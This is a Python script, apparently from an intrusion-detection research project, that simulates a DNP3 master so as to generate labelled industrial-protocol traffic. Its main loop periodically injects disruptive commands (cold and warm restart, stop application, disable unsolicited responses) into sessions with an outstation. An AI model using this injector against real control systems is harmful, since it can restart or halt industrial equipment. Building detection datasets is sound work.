"""Persistent DNP3 master that mirrors the real dataset's traffic structure:

- One long-lived TCP connection with reconnects every N seconds (so the
  capture produces several flows per class, not one giant one).
- Continuous class-1 polls (FC 0x01, g60v2 qual 0x06) at high cadence.
- Periodic class-0 integrity polls (FC 0x01, g60v1 qual 0x06) — these
  trigger the outstation's 292-byte fat response in the dataset.
- Periodic attack-frame injection at lower cadence: --attack-fc 0x0D for
  cold-restart, 0x0E warm, 0x0F init-data, 0x12 stop, 0x15 disable-uns.
- For NORMAL traffic, omit --attack-fc.

Match the real master's address scheme: master=13, outstation=2.

Usage:
  master_session.py --host 127.0.0.1 --port 20000 --duration 60 \
                    --attack-fc 0x0D --reconnect 5
"""
from __future__ import annotations
import argparse, random, socket, sys, time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))
from dnp3 import app_request, OBJ_CLASS0, OBJ_CLASS1

MASTER, OUTSTATION = 13, 2


def parse_fc(s: str):
    if s is None or s == "" or s == "none": return None
    return int(s, 0)


def make_attack_frame(fc: int, seq: int) -> bytes:
    """Build the attack request body for FC."""
    if fc in (0x0D, 0x0E):
        # cold/warm restart: no objects, 15-byte frame
        return app_request(MASTER, OUTSTATION, fc, b"", seq=seq)
    if fc == 0x0F:                                 # INIT_DATA: short, 18 bytes
        return app_request(MASTER, OUTSTATION, fc, b"", seq=seq)
    if fc == 0x12:                                 # STOP_APP, 18 bytes
        return app_request(MASTER, OUTSTATION, fc, b"", seq=seq)
    if fc in (0x14, 0x15):                         # ENABLE/DISABLE_UNS, 24 bytes
        objs = b"\x3C\x02\x06" + b"\x3C\x03\x06" + b"\x3C\x04\x06"
        return app_request(MASTER, OUTSTATION, fc, objs, seq=seq)
    return app_request(MASTER, OUTSTATION, fc, b"", seq=seq)


CLASS_OBJ_VARIANTS = [
    OBJ_CLASS1,
    b"\x3C\x02\x07\x05",                # qual 0x07 (limited count of 5)
    b"\x3C\x02\x06" + b"\x3C\x03\x06",  # class 1 + class 2 in one frame
]


def session(host, port, end_t, attack_fc, c1_period, c0_every_n, attack_every_n):
    """One TCP session. Returns when end_t reached or the socket dies."""
    s = socket.create_connection((host, port), timeout=5)
    s.settimeout(2.0)
    seq = 0
    n_polls = 0
    try:
        while time.time() < end_t:
            if attack_fc is not None and n_polls and n_polls % attack_every_n == 0:
                pkt = make_attack_frame(attack_fc, seq)
            elif n_polls and n_polls % c0_every_n == 0:
                pkt = app_request(MASTER, OUTSTATION, 0x01, OBJ_CLASS0, seq=seq)
            else:
                # rotate small-variant class polls so packet-length features
                # have within-class variance
                obj = CLASS_OBJ_VARIANTS[n_polls % len(CLASS_OBJ_VARIANTS)]
                pkt = app_request(MASTER, OUTSTATION, 0x01, obj, seq=seq)
            try:
                s.sendall(pkt)
                _ = s.recv(4096)
            except (OSError, socket.timeout):
                break
            seq = (seq + 1) & 0x0F
            n_polls += 1
            # small jitter so flow IAT features aren't a single constant
            time.sleep(c1_period + random.uniform(-c1_period*0.3, c1_period*0.3))
    finally:
        try: s.close()
        except Exception: pass


def main():
    p = argparse.ArgumentParser()
    p.add_argument("--host", default="127.0.0.1")
    p.add_argument("--port", type=int, default=20000)
    p.add_argument("--duration", type=float, default=60.0)
    p.add_argument("--attack-fc", default=None,
                   help="hex FC of attack to inject (e.g. 0x0D); omit for NORMAL")
    p.add_argument("--reconnect", type=float, default=5.0,
                   help="seconds before tearing down + reopening TCP (= flow rotation)")
    p.add_argument("--c1-period",     type=float, default=0.010,
                   help="seconds between class-1 polls (high-rate)")
    p.add_argument("--c0-every",      type=int, default=30,
                   help="run a class-0 integrity poll every N polls")
    p.add_argument("--attack-every",  type=int, default=20,
                   help="inject the attack frame every N polls")
    a = p.parse_args()
    fc = parse_fc(a.attack_fc)
    label = f"FC=0x{fc:02x}" if fc is not None else "NORMAL"
    print(f"[master_session] -> {a.host}:{a.port}  duration={a.duration}s  "
          f"reconnect={a.reconnect}s  attack={label}", flush=True)

    end_total = time.time() + a.duration
    n_sessions = 0
    while time.time() < end_total:
        end_sess = min(end_total, time.time() + a.reconnect
                       + random.uniform(-a.reconnect*0.2, a.reconnect*0.2))
        try:
            session(a.host, a.port, end_sess, fc,
                    a.c1_period, a.c0_every, a.attack_every)
        except OSError as e:
            print(f"[master_session] connect failed: {e}; retry in 1s", flush=True)
            time.sleep(1.0)
            continue
        n_sessions += 1
        time.sleep(0.05)        # tiny gap between sessions so flows clearly split
    print(f"[master_session] done; {n_sessions} sessions", flush=True)


if __name__ == "__main__":
    main()
